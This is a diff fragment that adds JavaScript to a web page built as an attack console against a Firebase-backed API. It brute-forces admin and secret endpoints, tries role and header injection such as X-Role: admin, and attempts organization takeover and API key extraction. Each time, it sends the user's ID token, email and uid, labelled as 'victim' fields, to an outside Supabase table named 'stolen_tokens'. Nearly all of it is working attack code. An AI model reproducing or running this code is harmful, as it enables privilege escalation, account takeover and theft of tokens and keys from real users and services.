+
+            try {
+                const resp = await fetch(`${API}/organizations/current`, {
+                    method: 'OPTIONS',
+                    headers: {
+                        'Origin': window.location.origin,
+                        'Access-Control-Request-Method': 'POST',
+                        'Access-Control-Request-Headers': 'Authorization, Content-Type'
+                    }
+                });
+
+                const headers = {};
+                resp.headers.forEach((val, key) => { headers[key] = val; });
+
+                log('headersLog', '[HEADERS] Response headers:', 'info');
+                for (const [key, val] of Object.entries(headers)) {
+                    log('headersLog', `  ${key}: ${val}`, 'data');
+                }
+
+                // Check specific security headers
+                const securityChecks = [
+                    { name: 'Content-Security-Policy', desc: 'Prevents XSS by restricting content sources', critical: true },
+                    { name: 'X-Content-Type-Options', desc: 'Prevents MIME sniffing', critical: false },
+                    { name: 'X-Frame-Options', desc: 'Prevents clickjacking', critical: false },
+                    { name: 'Strict-Transport-Security', desc: 'Forces HTTPS', critical: false },
+                    { name: 'X-XSS-Protection', desc: 'Browser XSS filter', critical: false },
+                    { name: 'Referrer-Policy', desc: 'Controls referrer info', critical: false },
+                    { name: 'Permissions-Policy', desc: 'Controls browser features', critical: false },
+                ];
+
+                log('headersLog', '', 'info');
+                log('headersLog', '[SECURITY] Security header analysis:', 'info');
+
+                for (const check of securityChecks) {
+                    const found = headers[check.name.toLowerCase()] || headers[check.name];
+                    if (found) {
+                        log('headersLog', `  [OK] ${check.name}: ${found}`, 'success');
+                    } else {
+                        const level = check.critical ? 'error' : 'warning';
+                        log('headersLog', `  [MISSING] ${check.name} - ${check.desc}`, level);
+                    }
+                }
+
+                // Check CORS
+                const corsHeader = headers['access-control-allow-origin'] || headers['Access-Control-Allow-Origin'];
+                if (corsHeader === '*') {
+                    log('headersLog', '[!] CORS: Access-Control-Allow-Origin: * - Any domain can call this API!', 'warning');
+                    log('headersLog', '[!] This means XSS on ANY site can steal data from this API!', 'error');
+                } else if (corsHeader) {
+                    log('headersLog', `[OK] CORS restricted to: ${corsHeader}`, 'success');
+                } else {
+                    log('headersLog', '[INFO] No CORS header found (likely same-origin only)', 'info');
+                }
+
+                await saveToSupabase({
+                    attack_type: 'security_headers',
+                    victim_email: currentUser?.email || '',
+                    victim_uid: currentUser?.uid || '',
+                    id_token: idToken,
+                    notes: `Security headers: ${Object.keys(headers).join(', ')} | Missing: ${securityChecks.filter(c => !headers[c.name.toLowerCase()]).map(c => c.name).join(', ')}`
+                });
+
+            } catch(e) {
+                log('headersLog', `[ERROR] Header check failed: ${e.message}`, 'error');
+            }
+        }
+
+        async function checkCORSConfig() {
+            log('headersLog', '[CORS] Detailed CORS configuration check...', 'info');
+
+            const origins = [
+                'https://evil.com',
+                'https://attacker.com',
+                'null',
+                window.location.origin,
+            ];
+
+            for (const origin of origins) {
+                try {
+                    const resp = await fetch(`${API}/organizations/current`, {
+                        method: 'GET',
+                        headers: {
+                            'Origin': origin,
+                        }
+                    });
+
+                    const acao = resp.headers.get('Access-Control-Allow-Origin');
+                    const acac = resp.headers.get('Access-Control-Allow-Credentials');
+
+                    if (acao) {
+                        log('headersLog', `[CORS] Origin "${origin}" -> Allow-Origin: "${acao}"${acac ? ' + Credentials' : ''}`, acao === '*' || acao === origin ? 'warning' : 'success');
+                    } else {
+                        log('headersLog', `[CORS] Origin "${origin}" -> No CORS header (blocked)`, 'info');
+                    }
+                } catch(e) {
+                    log('headersLog', `[CORS] Origin "${origin}" -> Error: ${e.message}`, 'error');
+                }
+            }
+        }
+
+        // =====================================================
+        // PRIVILEGE ESCALATION
+        // =====================================================
+        async function runPrivEsc() {
+            if (!idToken) { log('privescLog', '[ERROR] Authenticate first!', 'error'); return; }
+            log('privescLog', '[PRIVESC] Running privilege escalation tests...', 'warning');
+
+            // 1. Try accessing admin-only endpoints
+            log('privescLog', '[1] Testing admin endpoints...', 'info');
+            const adminEndpoints = [
+                { ep: 'admin', method: 'GET', desc: 'Admin Root' },
+                { ep: 'admin/users', method: 'GET', desc: 'Admin Users List' },
+                { ep: 'admin/settings', method: 'GET', desc: 'Admin Settings' },
+                { ep: 'admin/config', method: 'GET', desc: 'Admin Config' },
+                { ep: 'admin/roles', method: 'GET', desc: 'Admin Roles' },
+                { ep: 'admin/permissions', method: 'GET', desc: 'Admin Permissions' },
+                { ep: 'management', method: 'GET', desc: 'Management Root' },
+                { ep: 'management/users', method: 'GET', desc: 'Management Users' },
+                { ep: 'management/settings', method: 'GET', desc: 'Management Settings' },
+                { ep: 'internal', method: 'GET', desc: 'Internal Root' },
+                { ep: 'internal/config', method: 'GET', desc: 'Internal Config' },
+                { ep: 'debug', method: 'GET', desc: 'Debug' },
+                { ep: 'metrics', method: 'GET', desc: 'Metrics' },
+                { ep: 'health', method: 'GET', desc: 'Health Check' },
+                { ep: 'status', method: 'GET', desc: 'Status' },
+                { ep: 'version', method: 'GET', desc: 'Version' },
+                { ep: 'env', method: 'GET', desc: 'Environment' },
+                { ep: 'info', method: 'GET', desc: 'Info' },
+                { ep: 'config', method: 'GET', desc: 'Config' },
+            ];
+
+            for (const ep of adminEndpoints) {
+                try {
+                    const resp = await apiFetch(ep.ep);
+                    if (resp) {
+                        if (resp.status === 200) {
+                            const data = await resp.json();
+                            log('privescLog', `[+] ${ep.desc}: ACCESSIBLE! ${JSON.stringify(data).substring(0, 100)}`, 'success');
+                            idorFound++;
+
+                            await saveToSupabase({
+                                attack_type: 'privesc_admin_endpoint',
+                                victim_email: currentUser?.email || '',
+                                victim_uid: currentUser?.uid || '',
+                                id_token: idToken,
+                                idor_data: { endpoint: ep.ep, data: data },
+                                notes: `Admin endpoint accessible: ${ep.desc}`
+                            });
+                        } else if (resp.status === 401) {
+                            log('privescLog', `[!] ${ep.desc}: 401 Unauthorized (needs different auth)`, 'warning');
+                        } else if (resp.status === 403) {
+                            log('privescLog', `[-] ${ep.desc}: 403 Forbidden`, 'error');
+                        } else if (resp.status === 404) {
+                            // Silent
+                        } else {
+                            log('privescLog', `[?] ${ep.desc}: ${resp.status}`, 'warning');
+                        }
+                    }
+                } catch(e) {}
+                await new Promise(r => setTimeout(r, 50));
+            }
+
+            // 2. Try modifying role in requests
+            log('privescLog', '\n[2] Testing role manipulation in requests...', 'info');
+            const roleTests = [
+                { ep: 'accounts/users/current', method: 'PATCH', body: JSON.stringify({ role: 'admin' }), desc: 'Set role=admin' },
+                { ep: 'accounts/users/current', method: 'PATCH', body: JSON.stringify({ role: 'owner' }), desc: 'Set role=owner' },
+                { ep: 'accounts/users/current', method: 'PATCH', body: JSON.stringify({ isAdmin: true }), desc: 'Set isAdmin=true' },
+                { ep: 'accounts/users/current', method: 'PATCH', body: JSON.stringify({ permissions: ['admin'] }), desc: 'Set permissions=[admin]' },
+                { ep: 'accounts/users/current', method: 'PATCH', body: JSON.stringify({ customClaims: { admin: true } }), desc: 'Set customClaims.admin=true' },
+                { ep: 'organizations/current', method: 'PATCH', body: JSON.stringify({ role: 'admin' }), desc: 'Set org role=admin' },
+            ];
+
+            for (const test of roleTests) {
+                try {
+                    const resp = await apiWrite(test.ep, test.method, test.body);
+                    if (resp.ok) {
+                        const data = await resp.json();
+                        log('privescLog', `[+] ROLE MANIPULATION WORKED: ${test.desc}!`, 'success');
+                        log('privescLog', `[+] Response: ${JSON.stringify(data).substring(0, 100)}`, 'data');
+
+                        await saveToSupabase({
+                            attack_type: 'privesc_role_manipulation',
+                            victim_email: currentUser?.email || '',
+                            victim_uid: currentUser?.uid || '',
+                            id_token: idToken,
+                            notes: `Role manipulation succeeded: ${test.desc}`
+                        });
+                    } else {
+                        log('privescLog', `[-] ${test.desc}: ${resp.status}`, 'error');
+                    }
+                } catch(e) {}
+                await new Promise(r => setTimeout(r, 100));
+            }
+
+            // 3. Try using Firebase Admin SDK endpoints
+            log('privescLog', '\n[3] Testing Firebase Admin SDK endpoints...', 'info');
+            try {
+                const adminResp = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=${firebaseConfig.apiKey}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ idToken: idToken })
+                });
+                const adminData = await adminResp.json();
+                if (adminData.users) {
+                    log('privescLog', `[+] Firebase user lookup works! Data: ${JSON.stringify(adminData).substring(0, 200)}`, 'success');
+                    log('privescLog', `[INFO] Custom claims: ${JSON.stringify(adminData.users[0]?.customAuth || 'none')}`, 'data');
+                }
+            } catch(e) {
+                log('privescLog', `[-] Firebase admin lookup failed: ${e.message}`, 'error');
+            }
+
+            log('privescLog', '\n[PRIVESC] Privilege escalation tests complete.', 'success');
+            updateStats();
+        }
+
+        async function tryRoleInjection() {
+            if (!idToken) { log('privescLog', '[ERROR] Authenticate first!', 'error'); return; }
+            log('privescLog', '[ROLE] Testing role injection via API requests...', 'info');
+
+            // Try adding X-Role, X-Admin headers to requests
+            const headerInjections = [
+                { header: 'X-Role', value: 'admin' },
+                { header: 'X-User-Role', value: 'admin' },
+                { header: 'X-Is-Admin', value: 'true' },
+                { header: 'X-Forwarded-Role', value: 'admin' },
+                { header: 'X-Original-URL', value: '/admin' },
+                { header: 'X-Rewrite-URL', value: '/admin' },
+                { header: 'X-Override-Role', value: 'admin' },
+            ];
+
+            for (const inj of headerInjections) {
+                try {
+                    const resp = await fetch(`${API}/organizations/projects`, {
+                        method: 'POST',
+                        headers: {
+                            'Authorization': `Bearer ${idToken}`,
+                            'Content-Type': 'application/json',
+                            [inj.header]: inj.value,
+                        },
+                        body: JSON.stringify({ name: 'role_test', description: 'test' })
+                    });
+
+                    if (resp.ok) {
+                        log('privescLog', `[+] ${inj.header}: ${inj.value} -> SUCCESS! Write access granted!`, 'success');
+                        xssInjected++;
+                        await saveToSupabase({
+                            attack_type: 'privesc_header_injection',
+                            victim_email: currentUser?.email || '',
+                            victim_uid: currentUser?.uid || '',
+                            id_token: idToken,
+                            notes: `Header injection bypassed auth: ${inj.header}: ${inj.value}`
+                        });
+                    } else {
+                        log('privescLog', `[-] ${inj.header}: ${inj.value} -> ${resp.status}`, 'error');
+                    }
+                } catch(e) {
+                    log('privescLog', `[!] ${inj.header}: Error - ${e.message}`, 'error');
+                }
+                await new Promise(r => setTimeout(r, 100));
+            }
+
+            log('privescLog', '[ROLE] Role injection tests complete.', 'info');
+            updateStats();
+        }
+
+        async function tryOrgTakeover() {
+            if (!idToken) { log('privescLog', '[ERROR] Authenticate first!', 'error'); return; }
+            log('privescLog', '[ORG] Testing organization takeover vectors...', 'info');
+
+            // Try to modify org settings, invite users, change ownership
+            const orgTests = [
+                { ep: 'organizations/current', method: 'PATCH', body: JSON.stringify({ name: 'PWNED', ownerEmail: currentUser?.email }), desc: 'Change org name + owner' },
+                { ep: 'organizations/current/invite', method: 'POST', body: JSON.stringify({ email: currentUser?.email, role: 'admin' }), desc: 'Invite self as admin' },
+                { ep: 'organizations/members', method: 'POST', body: JSON.stringify({ email: currentUser?.email, role: 'admin' }), desc: 'Add member as admin' },
+                { ep: 'organizations/current/transfer', method: 'POST', body: JSON.stringify({ newOwnerEmail: currentUser?.email }), desc: 'Transfer ownership' },
+                { ep: 'organizations/roles/admin', method: 'PUT', body: JSON.stringify({ userId: currentUser?.uid }), desc: 'Assign admin role' },
+            ];
+
+            for (const test of orgTests) {
+                try {
+                    const resp = await apiWrite(test.ep, test.method, test.body);
+                    if (resp.ok) {
+                        const data = await resp.json();
+                        log('privescLog', `[+] ${test.desc}: SUCCESS! ${JSON.stringify(data).substring(0, 100)}`, 'success');
+                        xssInjected++;
+
+                        await saveToSupabase({
+                            attack_type: 'privesc_org_takeover',
+                            victim_email: currentUser?.email || '',
+                            victim_uid: currentUser?.uid || '',
+                            id_token: idToken,
+                            notes: `Org takeover succeeded: ${test.desc}`
+                        });
+                    } else {
+                        log('privescLog', `[-] ${test.desc}: ${resp.status}`, 'error');
+                    }
+                } catch(e) {
+                    log('privescLog', `[!] ${test.desc}: ${e.message}`, 'error');
+                }
+                await new Promise(r => setTimeout(r, 100));
+            }
+
+            log('privescLog', '[ORG] Organization takeover tests complete.', 'info');
+            updateStats();
+        }
+
+        async function tryAPIKeyExtract() {
+            if (!idToken) { log('privescLog', '[ERROR] Authenticate first!', 'error'); return; }
+            log('privescLog', '[APIKEY] Trying to extract API keys...', 'info');
+
+            const keyEndpoints = [
+                'organizations/apiKeys',
+                'organizations/api-keys',
+                'organizations/credentials',
+                'organizations/secrets',
+                'organizations/tokens',
+                'api-keys',
+                'credentials',
+                'settings/api-keys',
+                'integrations',
+                'integrations/api-keys',
+                'webhooks',
+                'webhooks/keys',
+            ];
+
+            for (const ep of keyEndpoints) {
+                try {
+                    const resp = await apiFetch(ep);
+                    if (resp && resp.status === 200) {
+                        const data = await resp.json();
+                        log('privescLog', `[+] ${ep}: ACCESSIBLE! ${JSON.stringify(data).substring(0, 150)}`, 'success');
+                        idorFound++;
+
+                        await saveToSupabase({
+                            attack_type: 'api_key_extraction',
+                            victim_email: currentUser?.email || '',
+                            victim_uid: currentUser?.uid || '',
+                            id_token: idToken,
+                            idor_data: { endpoint: ep, data: data },
+                            notes: `API key extraction: ${ep} accessible`
+                        });
+                    } else if (resp && resp.status !== 404) {
+                        log('privescLog', `[-] ${ep}: ${resp.status}`, 'error');
+                    }
+                } catch(e) {}
+                await new Promise(r => setTimeout(r, 50));
+            }
+
+            log('privescLog', '[APIKEY] API key extraction tests complete.', 'info');
+            updateStats();
+        }
+
+        async function tryAdminEndpoints() {
+            if (!idToken) { log('privescLog', '[ERROR] Authenticate first!', 'error'); return; }
+            log('privescLog', '[ADMIN] Probing admin/superuser endpoints...', 'info');
+
+            const endpoints = [
+                'admin/dashboard', 'admin/users', 'admin/settings', 'admin/audit',
+                'superadmin', 'superuser', 'root', 'system',
+                'api/v1/admin', 'api/admin', 'api/management',
+                'console', 'dashboard/admin', 'backoffice',
+                'graphql', 'graphiql', 'playground',
+                'swagger', 'api-docs', 'docs', 'openapi',
+                'trace', 'profiler', 'debug/vars', 'pprof',
+                '.env', 'config.json', 'settings.json', 'package.json',
+                'firebase', 'firebase-config', 'service-account',
+            ];
+
+            for (const ep of endpoints) {
+                try {
+                    const resp = await apiFetch(ep);
+                    if (resp) {
+                        if (resp.status === 200) {
+                            const text = await resp.text();
+                            log('privescLog', `[+] /${ep}: 200 OK! ${text.substring(0, 100)}`, 'success');
+
+                            await saveToSupabase({
+                                attack_type: 'admin_endpoint_found',
+                                victim_email: currentUser?.email || '',
+                                victim_uid: currentUser?.uid || '',
+                                id_token: idToken,
+                                idor_data: { endpoint: ep, response: text.substring(0, 500) },
+                                notes: `Admin endpoint found: /${ep}`
+                            });
+                        } else if (resp.status === 401) {
+                            log('privescLog', `[!] /${ep}: 401 (exists, needs different auth)`, 'warning');
+                        } else if (resp.status === 403) {
+                            log('privescLog', `[!] /${ep}: 403 (exists, needs higher role)`, 'warning');
+                        }
+                    }
+                } catch(e) {}
+                await new Promise(r => setTimeout(r, 30));
+            }
+
+            log('privescLog', '[ADMIN] Admin endpoint probing complete.', 'info');
+        }
+
+        // =====================================================
+        // ENDPOINT AUTHORIZATION MAP
+        // =====================================================
+        async function mapAllEndpoints() {
+            if (!idToken) { log('privescLog', '[ERROR] Authenticate first!', 'error'); return; }
+            log('privescLog', '[MAP] Mapping endpoint authorization...', 'info');
+
+            const mapEl = document.getElementById('endpointMap');
+            mapEl.innerHTML = '<div style="color:#888;font-size:12px;">Scanning...</div>';
+
+            const endpoints = [
+                { ep: 'projects', method: 'GET' },
+                { ep: 'projects', method: 'POST' },
+                { ep: 'organizations/current', method: 'GET' },
+                { ep: 'organizations/current', method: 'PATCH' },
+                { ep: 'organizations/projects', method: 'GET' },
+                { ep: 'organizations/projects', method: 'POST' },
+                { ep: 'organizations/apiKeys', method: 'GET' },
+                { ep: 'organizations/apiKeys', method: 'POST' },
+                { ep: 'accounts/users/current', method: 'GET' },
+                { ep: 'accounts/users/current', method: 'PATCH' },
+                { ep: 'users', method: 'GET' },
+                { ep: 'worlds', method: 'GET' },
+                { ep: 'worlds', method: 'POST' },
+                { ep: 'wallet/nonce', method: 'GET' },
+                { ep: 'wallet/nonce', method: 'POST' },
+                { ep: 'wallet/verify/signin', method: 'POST' },
+                { ep: 'sessions', method: 'GET' },
+                { ep: 'sessions', method: 'POST' },
+                { ep: 'permissions/roles', method: 'GET' },
+                { ep: 'billing/enabled', method: 'GET' },
+                { ep: 'profile', method: 'GET' },
+                { ep: 'origin/access', method: 'GET' },
+                { ep: 'origin/streaming', method: 'GET' },
+            ];
+
+            let html = '';
+
+            for (const e of endpoints) {
+                try {
+                    let resp;
+                    if (e.method === 'GET') {
+                        resp = await apiFetch(e.ep);
+                    } else {
+                        resp = await apiWrite(e.ep, e.method, JSON.stringify({ name: 'test' }));
+                    }
+
+                    let statusClass = '';
+                    let cardClass = '';
+                    if (resp.ok) { statusClass = 's200'; cardClass = 'ep-ok'; }
+                    else if (resp.status === 403) { statusClass = 's403'; cardClass = 'ep-403'; }
+                    else if (resp.status === 400) { statusClass = 's400'; cardClass = 'ep-400'; }
+                    else if (resp.status === 404) { statusClass = 's404'; cardClass = 'ep-404'; }
+                    else { statusClass = 's404'; cardClass = ''; }
+
+                    html += `<div class="ep-card ${cardClass}">
+                        <span class="ep-method">${e.method}</span>
+                        <span class="ep-path">/${e.ep}</span>
+                        <span class="ep-status ${statusClass}">${resp.status}</span>
+                    </div>`;
+                } catch(e) {
+                    html += `<div class="ep-card"><span class="ep-method">${e.method}</span> <span class="ep-path">/${e.ep}</span> <span class="ep-status s404">ERR</span></div>`;
+                }
+                await new Promise(r => setTimeout(r, 100));
+            }
+
+            mapEl.innerHTML = html;
+            log('privescLog', '[MAP] Endpoint mapping complete.', 'success');
+        }
+
+        // =====================================================
+        // RESULTS
+        // =====================================================
+        async function fetchResults() {
+            if (!db) { log('resultsLog', '[ERROR] Supabase not initialized', 'error'); return; }
+            log('resultsLog', '[RESULTS] Fetching from Supabase...', 'info');
+
+            try {
+                const { data, error } = await db
+                    .from('stolen_tokens')
+                    .select('*')
+                    .order('created_at', { ascending: false })
+                    .limit(50);
+
+                if (error) {
+                    log('resultsLog', `[ERROR] ${error.message}`, 'error');
+                    return;
+                }
+
+                if (!data || data.length === 0) {
+                    log('resultsLog', '[RESULTS] No data found in Supabase.', 'warning');
+                    return;
+                }
+
+                log('resultsLog', `[RESULTS] Found ${data.length} records:`, 'success');
+
+                for (const row of data) {
+                    const type = row.attack_type || 'unknown';
+                    const email = row.victim_email || row.notes || '';
+                    const time = row.created_at ? new Date(row.created_at).toLocaleString() : '';
+                    log('resultsLog', `[${type}] ${email.substring(0, 60)} | ${time}`, 'data');
+                }
+            } catch(e) {
+                log('resultsLog', `[ERROR] ${e.message}`, 'error');
+            }
+        }
     </script>
 </body>
 </html>
